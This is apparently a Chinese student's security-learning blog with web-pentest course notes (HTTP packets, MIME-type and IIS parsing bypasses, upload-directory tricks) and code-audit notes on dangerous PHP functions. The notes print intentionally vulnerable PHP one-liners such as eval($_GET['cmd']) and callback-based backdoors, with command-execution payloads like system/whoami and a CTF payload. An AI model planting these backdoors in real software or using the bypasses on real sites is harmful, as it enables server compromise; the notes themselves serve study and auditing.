<h2 id="DAY2-基础入门-数据包拓展"><a href="#DAY2-基础入门-数据包拓展" class="headerlink" title="DAY2 基础入门-数据包拓展"></a>DAY2 基础入门-数据包拓展</h2><h3 id="1-proxy"><a href="#1-proxy" class="headerlink" title="1.proxy"></a>1.proxy</h3><p>下面这张图很好的解释了<strong>proxy</strong>的作用，它是浏览器和服务器之间的，是两者数据交互的中间桥梁，利用<strong>proxy</strong>就可以实现修改浏览器发送的请求和服务器发回的数据包，或者拦截获取</p>
<p><img src="/2022/07/21/xiaodi/image-20220721144031544.png" alt="image-20220721144031544"></p>
<h3 id="2-http和https"><a href="#2-http和https" class="headerlink" title="2.http和https"></a>2.http和https</h3><p><strong>https</strong>相对<strong>http</strong>更安全的原因在于<strong>SSL or TLS</strong>的存在，它不在像<strong>http</strong>一样把信息以明文的形式呈现出来，比如利用<strong>burp</strong>抓包，http的信息（比如账号密码）就会显现出来，而<strong>SSL or TLS</strong>会对其信息进行加密<strong>（需要私钥才解的开）</strong>，那就算被抓包，也只能得到一串加密数据</p>
<p><u>这里推荐可以买本<strong>《图解http》</strong>看看</u></p>
<p><img src="/2022/07/21/xiaodi/image-20220721144040328.png" alt="image-20220721144040328"></p>
<p> 下面是http简要通讯流程</p>
<p><img src="/2022/07/21/xiaodi/1.png" alt="image-20220721150847367"></p>
<p>下面就是https的响应流程</p>
<p><img src="/2022/07/21/xiaodi/image-20220721150429225.png" alt="image-20220721150429225"></p>
<h3 id="3-Request请求数据包"><a href="#3-Request请求数据包" class="headerlink" title="3.Request请求数据包"></a>3.Request请求数据包</h3><p><img src="/2022/07/21/xiaodi/image-20220723220144117.png" alt="image-20220723220144117"></p>
<h4 id="1-请求行"><a href="#1-请求行" class="headerlink" title="1.请求行"></a>1.请求行</h4><p>如下例，</p>
<p>请求方法：GET   ||  请求url：index.html  ||   HTTP版本：1.1</p>
<p><img src="/2022/07/21/xiaodi/image-20220723220333853.png" alt="image-20220723220333853"></p>
<p><img src="/2022/07/21/xiaodi/image-20220723221340261.png" alt="image-20220723221340261"></p>
<h4 id="2-请求头"><a href="#2-请求头" class="headerlink" title="2.请求头"></a>2.请求头</h4><p><img src="/2022/07/21/xiaodi/image-20220724172547877.png" alt="image-20220724172547877"></p>
<p>1）MIME文件格式可以修改绕过MIME验证，在文件上传的时候，就可以修改MIME类型来绕过前端验证</p>
<p>比如需要图片格式，但设有MIME验证，而上传php或其他文件时，</p>
<p>Accept为application&#x2F;octet-stream   为了上传成功就需要修改其为image&#x2F;png，从而绕过MIME验证</p>
<p><img src="/2022/07/21/xiaodi/image-20220724173613276.png" alt="image-20220724173613276"></p>
<p>Referer代表产生请求的网页，如果是在该网站访问该网站的链接，那referer可能为空，如果是从其他网站请求访问，就会在referer处显示网站url</p>
<p>一些网站可能会验证referer判断是否可能是从其他网站来的，保护用户账号安全，避免用户cookie被盗用，也就是csrf漏洞</p>
<p><img src="/2022/07/21/xiaodi/image-20220724175117961.png" alt="image-20220724175117961"></p>
<h4 id="3-空行和请求体"><a href="#3-空行和请求体" class="headerlink" title="3.空行和请求体"></a>3.空行和请求体</h4><p><img src="/2022/07/21/xiaodi/image-20220724211529241.png" alt="image-20220724211529241"></p>
<p>空行和请求体可以看看下面这个例子</p>
<p><img src="/2022/07/21/xiaodi/image-20220724203919573.png" alt="image-20220724203919573"></p>
<p>可以看到请求体是<code>id=1&amp;submit=%E6%9F%A5%E8%AF%A2</code>而其上面就是和请求头分开的空行</p>
<p><img src="/2022/07/21/xiaodi/image-20220724203945852.png" alt="image-20220724203945852"></p>
<h3 id="4-response返回数据包"><a href="#4-response返回数据包" class="headerlink" title="4.response返回数据包"></a>4.response返回数据包</h3><p><img src="/2022/07/21/xiaodi/image-20220724213601900.png" alt="image-20220724213601900"></p>
<p><u><strong>HTTP响应码（状态码）</strong></u></p>
<p><img src="/2022/07/21/xiaodi/image-20220723215355113.png" alt="image-20220723215355113"></p>
<h4 id="1-状态行"><a href="#1-状态行" class="headerlink" title="1.状态行"></a>1.状态行</h4><p>下例<strong>状态代码</strong>：200  || <strong>协议版本</strong>：HTTP&#x2F;1.1 ||   <strong>状态描述</strong>：OK</p>
<p><img src="/2022/07/21/xiaodi/image-20220724222056594.png" alt="image-20220724222056594"></p>
<h4 id="2-响应头标"><a href="#2-响应头标" class="headerlink" title="2.响应头标"></a>2.响应头标</h4><p>上图除了第一行以外就是响应头标，类似请求头</p>
<h4 id="3-空行"><a href="#3-空行" class="headerlink" title="3.空行"></a>3.空行</h4><p>在响应头标和响应数据之间，表示响应头标的结束</p>
<h4 id="4-响应数据"><a href="#4-响应数据" class="headerlink" title="4.响应数据"></a>4.响应数据</h4><p><strong>响应数据</strong>就是当前页面的源代码</p>
<p><img src="/2022/07/21/xiaodi/image-20220724222442836.png" alt="image-20220724222442836"></p>
<hr>
<h2 id="DAY3-基础入门-搭建安全拓展"><a href="#DAY3-基础入门-搭建安全拓展" class="headerlink" title="DAY3 基础入门-搭建安全拓展"></a>DAY3 基础入门-搭建安全拓展</h2><h3 id="1-常见搭建平台脚本启用"><a href="#1-常见搭建平台脚本启用" class="headerlink" title="1.常见搭建平台脚本启用"></a>1.常见搭建平台脚本启用</h3><p><img src="/2022/07/21/xiaodi/image-20220725230825776.png" alt="image-20220725230825776"></p>
<h3 id="2-域名IP目录解析安全问题"><a href="#2-域名IP目录解析安全问题" class="headerlink" title="2.域名IP目录解析安全问题"></a>2.域名IP目录解析安全问题</h3><p><strong>域名访问</strong>时（如<code>www.baidu.com</code>）一般是<strong>指向某个特定文件</strong>，用工具扫描时，也只能扫描该目录下的文件</p>
<p><strong>IP访问</strong>时就可以<strong>访问到根目录</strong>，扫描时就可能扫描到该站点下的所有文件，甚至还有网站源码备份文件</p>
<p><u>一般是IP和域名同时使用</u></p>
<h3 id="3-常见文件后缀解析对应安全"><a href="#3-常见文件后缀解析对应安全" class="headerlink" title="3.常见文件后缀解析对应安全"></a>3.常见文件后缀解析对应安全</h3><p><img src="/2022/07/21/xiaodi/image-20220725210703706.png" alt="image-20220725210703706"></p>
<p>下图是，iis中间件</p>
<p>扩展名对应配置文件，使得有该扩展名的文件以配置文件定义的方式打开或运行</p>
<p>如，添加一个扩展名为.haha，对应的配置文件就为下图的.asp扩展名对应的配置文件，这样打开.haha扩展名的文件就相当于打开.asp类型的文件了</p>
<p>所以，利用这个有时候我们上传以为正确的文件扩展名，但却无法以我们想要的方式打开或者用蚁剑、菜刀等工具连接，就可能是中间件解析协议修改了本来的扩展名</p>
<p>如删除了.asp，只保留.haha扩展名，如果上传.asp扩展名文件，就会无效，使得我们受阻，只有上传.haha扩展名文件才可以被视为asp文件</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">这里做个补充，，之前做过一个“内部文件上传系统漏洞分析溯源”的题，提到了iis低版本解析漏洞</span><br><span class="line"></span><br><span class="line">IIS解析漏洞分为两种：</span><br><span class="line">（1）一种是在以“<span class="string">.asp</span>”“<span class="string">.asa</span>”命名的文件夹内，所有文件都以asp文件被解析。</span><br><span class="line">（2）第二种是IIS的文件解析,形式：<span class="string">/xx.asp</span>;<span class="string">.jpg</span>（利⽤特殊符号 <span class="string">&quot;;&quot;</span><span class="string">.xx.asp</span>;<span class="string">.jpg</span> 被解析为asp脚本</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/21/xiaodi/image-20220725223658222.png" alt="image-20220725223658222"></p>
<h3 id="4-常见安全测试中的安全防护"><a href="#4-常见安全测试中的安全防护" class="headerlink" title="4.常见安全测试中的安全防护"></a>4.常见安全测试中的安全防护</h3><h4 id="1-拒绝匿名访问"><a href="#1-拒绝匿名访问" class="headerlink" title="1.拒绝匿名访问"></a>1.拒绝匿名访问</h4><p>这样想要访问网站页面的时候，就需要输入限定账号和密码，否则就无法进行访问</p>
<h4 id="2-拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）"><a href="#2-拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）" class="headerlink" title="2.拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）"></a>2.拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）</h4><p>通过添加对方IP，来实现在IP内的所有计算机网络都无法访问该网站</p>
<h3 id="5-WEB后门与用户及文件权限"><a href="#5-WEB后门与用户及文件权限" class="headerlink" title="5.WEB后门与用户及文件权限"></a>5.WEB后门与用户及文件权限</h3><p>利用菜刀等工具，可以连接到服务器中的后门，但是如果服务器端设置了对Internet 来宾用户的权限时，就会遇到阻碍</p>
<p>如设置拒绝读取，那么菜刀就无法读取该文件夹下的内容，就在前面提到网站的拒绝匿名访问</p>
<p>如果设置拒绝写入，那么菜刀就无法在其中新建文件</p>
<p>但是该网站这个目录下的网站页面，也无法正常访问</p>
<p><img src="/2022/07/21/xiaodi/image-20220726110555183.png" alt="image-20220726110555183"></p>
<p>下图为网站不给执行权限，也就是里面的文件都无法执行，这样无论是访问我们上传的木马，还是菜刀试着连接木马，都不行，以因为没有了执行权限，那么我们写的一句话木马的代码也发挥不了作用</p>
<p>这也是实战中为什么会这么困难和复杂</p>
<p><u><strong>那么一般如何解决这个问题呢？</strong></u></p>
<p>我们可以试试换一个目录，一般这种限制最可能在例如upload这种目录，但是img这类图片目录下，常理而言是没有脚本文件，所以很有可能是没有加以限制的，所以在上传文件的时候，可以试试抓包然后修改文件上传的目录，从而使得脚本可以正常执行和与工具连接</p>
<p>一般思路就是把脚本文件努力上传到最可能没有限制的目录下，比如<u>根目录</u>，或者<u>网站自身的脚本目录</u>（因为它自身可能也需要运行它自己的脚本，所以大概率不可能在那个目录下加上权限，这样它自己也无法正常运行了）</p>
<p><img src="/2022/07/21/xiaodi/image-20220726110523557.png" alt="image-20220726110523557"></p>
<h3 id="6-网站源码脚本格式"><a href="#6-网站源码脚本格式" class="headerlink" title="6.网站源码脚本格式"></a>6.网站源码脚本格式</h3><p><code>一般可以根据数据库类型，或者网站搭建的中间件平台加以推导</code></p>
<h4 id="1-知道数据库类型"><a href="#1-知道数据库类型" class="headerlink" title="1.知道数据库类型"></a>1.知道数据库类型</h4><p>mysql数据库一般是php脚本</p>
<p>sqlserver数据库一般是asp或aspx脚本</p>
<p>oracle数据库一般是python脚本</p>
<h4 id="2-知道中间件"><a href="#2-知道中间件" class="headerlink" title="2.知道中间件"></a>2.知道中间件</h4><p>iis一般用asp或aspx</p>
<p>apache一般php脚本居多</p>
<p>tomcat一般jsp脚本</p>
<p>如果判断不出网站的源码脚本文件，</p>
<p>可能网站做了伪静态，那么在脚本类型不会在网站地址下去体现，但是用<u><strong>扫描工具</strong></u>可以更加深入的爬寻文件</p>
<p>还有一个方法就是在<u><strong>谷歌搜索引擎</strong></u>上看看有没有该网站的快照信息，有快照信息就可以针对性的用关键词筛选一下，看有没有脚本运行信息出现</p>
<p>还有就是可以<u><strong>抓网站的数据包</strong></u>，看看数据包里，一般的如果数据包的写法不同，里面的cookie值就会有所不同，比如phpsession,jspsession，就可以根据前缀知道是什么类型的脚本文件 ，如果都不是可能就是asp或aspx</p>
<hr>
<h2 id="DAY4-基础入门-WEB源码拓展"><a href="#DAY4-基础入门-WEB源码拓展" class="headerlink" title="DAY4 基础入门-WEB源码拓展"></a>DAY4 基础入门-WEB源码拓展</h2><p><img src="/2022/07/21/xiaodi/image-20220727150617311.png" alt="image-20220727150617311"></p>
<p><img src="/2022/07/21/xiaodi/image-20220727150829672.png" alt="image-20220727150829672"></p>
<h3 id="1-网站源码文件目录"><a href="#1-网站源码文件目录" class="headerlink" title="1.网站源码文件目录"></a>1.网站源码文件目录</h3><p><code>admin</code>：后台文件目录</p>
<p><code>data</code>：数据相关，可能有数据库配置文件【可能直接连接到对方的数据库获得对方的数据库信息】</p>
<p><code>include</code>：数据库目录</p>
<p><code>template</code>：网站模板文件,和网站界面相关，优化网站架构【(艹皿艹 )想起学ssti漏洞，看了好几天文章】</p>
<h3 id="2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"><a href="#2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题" class="headerlink" title="2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"></a>2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题</h3><p>可以在这个网站上看看脚本语言类型</p>
<p><code>https://websec.readthedocs.io/zh/latest/language/index.html</code></p>
<p>当看到网站的脚本格式时，就大致可以猜测到大概容易出现什么漏洞，</p>
<p>因为网站源码语言和应用不同，编写的方式也不同，出现的问题也就不同，从而针对性的寻找或修复漏洞，节约时间，提高效率</p>
<h3 id="3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"><a href="#3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞" class="headerlink" title="3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"></a>3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞</h3><h3 id="4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"><a href="#4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等" class="headerlink" title="4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"></a>4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</h3><p>CMS：内容管理系统（content management system，CMS），是一种位于WEB前端（Web  服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、<a href="https://baike.baidu.com/item/Intranet/3247037">Intranet</a>以及<a href="https://baike.baidu.com/item/Extranet/10579301">Extranet</a>网站的信息。</p>
<h3 id="5-关于源码获取相关途径"><a href="#5-关于源码获取相关途径" class="headerlink" title="5.关于源码获取相关途径"></a>5.关于源码获取相关途径</h3><p>搜索，咸鱼淘宝，第三方源码站，各种行业对应，一些源码可能就可以找到源码，但一般是大众型的，而一些小型（或者灰色的网站）网站可能搜不到的，咸鱼等一些第三方源码可能找到的</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="#总结"></a>#总结</h3><p>关注应用分类及脚本类型估摸出可能存在的漏洞(其中框架类例外)，在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理(数据库备份，bak文件等)，未获取到的源码采用各种方法想办法获取!</p>
<hr>
<h3 id="asp网站"><a href="#asp网站" class="headerlink" title="asp网站"></a>asp网站</h3><p>有一个<code>mdb</code>文件【表格文件】，存放数据，相当于数据库，后台的账号密码一般在上面</p>
<p>如果网站是直接套用的网站源码结构，没有进行修改，其中就包括数据库路径，那么我们就可以尝试把数据库的路径防止物联网网上尝试下载【一般是进行过滤了，几乎不可能下载成功】，</p>
<p>比如知道<code>www.hahaha.com</code>这个网站的数据库在<code>/admin/schema/</code>这个路径里，数据库文件名为<code>flag.mdb</code></p>
<p>那我们访问<code>www.hahaha.com/admin/schema/flag.mdb</code>就可能下载下来数据库文件，查看里面的后台的账号和密码【密码一般加密了的(md5)】</p>
<h3 id="php网站"><a href="#php网站" class="headerlink" title="php网站"></a>php网站</h3>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>视频学习记录</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计知识点记录</title>
    <url>/2022/06/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p><code>代码审计学习的一些笔记</code></p>
<span id="more"></span>

<h1 id="代码审计-常见php威胁函数（上）"><a href="#代码审计-常见php威胁函数（上）" class="headerlink" title="代码审计-常见php威胁函数（上）"></a>代码审计-常见php威胁函数（上）</h1><blockquote>
<p>文章来自<a href="https://baijiahao.baidu.com/s?id=1715285716686081123&wfr=spider&for=pc">成都知道创宇</a></p>
</blockquote>
<h2 id="1-常见php回调函数，可调用其他命令-x2F-代码执行函数"><a href="#1-常见php回调函数，可调用其他命令-x2F-代码执行函数" class="headerlink" title="1.常见php回调函数，可调用其他命令&#x2F;代码执行函数"></a>1.常见php回调函数，可调用其他命令&#x2F;代码执行函数</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">call_user_func</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">call_user_func_array</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">create_function</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_walk</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_map</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_filter</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usort</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ob_start</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">可变函数$_GET<span class="selector-attr">[<span class="string">&#x27;a&#x27;</span>]</span>($_GET<span class="selector-attr">[<span class="string">&#x27;b&#x27;</span>]</span>)</span><br></pre></td></tr></table></figure>



<h2 id="2-常见php可执行系统命令的函数："><a href="#2-常见php可执行系统命令的函数：" class="headerlink" title="2.常见php可执行系统命令的函数："></a>2.常见php可执行系统命令的函数：</h2><p>system()、passthru()、exec()、shell_exec()、 pcntl_exec()、popen()、proc_open()</p>
<h2 id="3-常见php可代码执行的函数："><a href="#3-常见php可代码执行的函数：" class="headerlink" title="3.常见php可代码执行的函数："></a>3.常见php可代码执行的函数：</h2><p>eval()、assert()、preg_replace()、$</p>
<h2 id="4-禁用危险函数："><a href="#4-禁用危险函数：" class="headerlink" title="4.禁用危险函数："></a>4.禁用危险函数：</h2><p>php配置文件php.ini里有个disable_functions &#x3D; 配置选项，可自定义禁用某些php危险函数.如:disable_functions &#x3D;system,passthru,shell_exec,exec,popen</p>
<h2 id="一、可执行php代码的函数"><a href="#一、可执行php代码的函数" class="headerlink" title="一、可执行php代码的函数"></a>一、可执行php代码的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="title function_ invoke__">assert</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php 7.1.7 ，已经无法用call_user_func回调调用 test.php?cmd&#x3D;phpinfo(); preg_replace()  5.6以下可以执行 5.6以上仍然可以执行，但是会有警告 PHP7后已经不支持&#x2F;e修饰符  preg_replace(“&#x2F;test&#x2F;e”,$_GET[“h”],”jutst test”); &#x2F;&#x2F;将jutst  test以&#x2F;test正则匹配以h来替换 &#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码  ?h&#x3D;phpinfo() ${phpinfo()}</p>
<h2 id="二、常见php回调函数，可调用其他命令-x2F-代码执行函数："><a href="#二、常见php回调函数，可调用其他命令-x2F-代码执行函数：" class="headerlink" title="二、常见php回调函数，可调用其他命令&#x2F;代码执行函数："></a>二、常见php回调函数，可调用其他命令&#x2F;代码执行函数：</h2><h3 id="1-call-user-func"><a href="#1-call-user-func" class="headerlink" title="1) call_user_func()"></a>1) call_user_func()</h3><p><code>call_user_func</code> — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数</p>
<h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2=whoami  //命令执行</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2=phpinfo()   //代码执行 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="调用类中的函数"><a href="#调用类中的函数" class="headerlink" title="调用类中的函数"></a>调用类中的函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>



<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="title">php中 -&gt;与::</span> 调用类中的成员的区别</span><br><span class="line"></span><br><span class="line"> -&gt;用于动态语境处理某个类的某个实例</span><br><span class="line"> </span><br><span class="line"><span class="title"> ::</span>可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure>

<p>所以这里<code>payload</code>为</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ctfshow</span>=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<h4 id="调用类中的函数【数组】"><a href="#调用类中的函数【数组】" class="headerlink" title="调用类中的函数【数组】"></a>调用类中的函数【数组】</h4><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">call<span class="constructor">_user_func()</span>参数不仅可以是字符串，还有 数组形式！</span><br><span class="line"></span><br><span class="line">call<span class="constructor">_user_func(<span class="params">array</span>($<span class="params">classname</span>, &#x27;<span class="params">say_hello</span>&#x27;)</span>);</span><br><span class="line">调用classname这个类里的sya_hello方法</span><br><span class="line"></span><br><span class="line"><span class="built_in">array</span><span class="literal">[<span class="number">0</span>]</span>=$classname  类名</span><br><span class="line"><span class="built_in">array</span><span class="literal">[<span class="number">1</span>]</span>=say_hello   say<span class="constructor">_hello()</span>方法</span><br></pre></td></tr></table></figure>



<pre><code>按照上述格式得到payload：

ctfshow[]=ctfshow&amp;ctfshow[]=getFlag   #POST
</code></pre>
<h3 id="2-call-user-func-array"><a href="#2-call-user-func-array" class="headerlink" title="2)call_user_func_array()"></a>2)call_user_func_array()</h3><p>call_user_func_array()把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2[]=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-create-function"><a href="#3-create-function" class="headerlink" title="3)create_function()"></a>3)create_function()</h3><p>创建匿名函数（Anonymous functions），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="variable">$b</span>();</span><br><span class="line"><span class="comment">//xxx.php?a=phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-array-walk"><a href="#4-array-walk" class="headerlink" title="4) array_walk()"></a>4) array_walk()</h3><p>array_walk — 使用用户自定义函数对数组中的每个元素做回调处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a[]=phpinfo()&amp;b=assert</span></span><br><span class="line"><span class="comment">//xxx.php?a[]=whoami&amp;b=system</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-array-map"><a href="#5-array-map" class="headerlink" title="5)array_map()"></a>5)array_map()</h3><p>array_map()为数组的每个元素应用回调函数。返回数组，是为 array1 每个元素应用 callback函数之后的数组。callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a=assert&amp;b[]=phpinfo()</span></span><br><span class="line"><span class="comment">//$array = array(0,1,2,3,4,5);</span></span><br><span class="line"><span class="comment">//array_map($_GET[&#x27;a&#x27;],$array);</span></span><br><span class="line"><span class="comment">//.php?a=phpinfo </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="6-array-filter"><a href="#6-array-filter" class="headerlink" title="6) array_filter()"></a>6) array_filter()</h3><p>array_filter()用回调函数过滤数组中的单元。依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true， 则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]),<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="comment">//?func=assert&amp;cmd=phpinfo() </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-可变函数-var-args"><a href="#7-可变函数-var-args" class="headerlink" title="7) 可变函数$var(args)"></a>7) 可变函数$var(args)</h3><p>PHP 支持可变函数的概念。如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数， 并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b=whoami</span></span><br><span class="line"><span class="comment">//xxx?a=assert&amp;b=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="8-usort"><a href="#8-usort" class="headerlink" title="8) usort()"></a>8) usort()</h3><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序 php5.6之前可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">1</span>.php?<span class="number">1</span>[<span class="number">0</span>]=<span class="number">0</span>&amp;<span class="number">1</span>[<span class="number">1</span>]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert POST传参: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<h3 id="9）uasort"><a href="#9）uasort" class="headerlink" title="9）uasort"></a>9）uasort</h3><p>php5.6 php7不可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$onearray</span> = <span class="keyword">array</span>(<span class="string">&#x27;Ameng&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="variable">$onearray</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload: <span class="number">1</span>.php?a=assert POST传参: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<h3 id="10）ob-start"><a href="#10）ob-start" class="headerlink" title="10）ob_start"></a>10）ob_start</h3><p>ob_start — 打开输出控制缓冲</p>
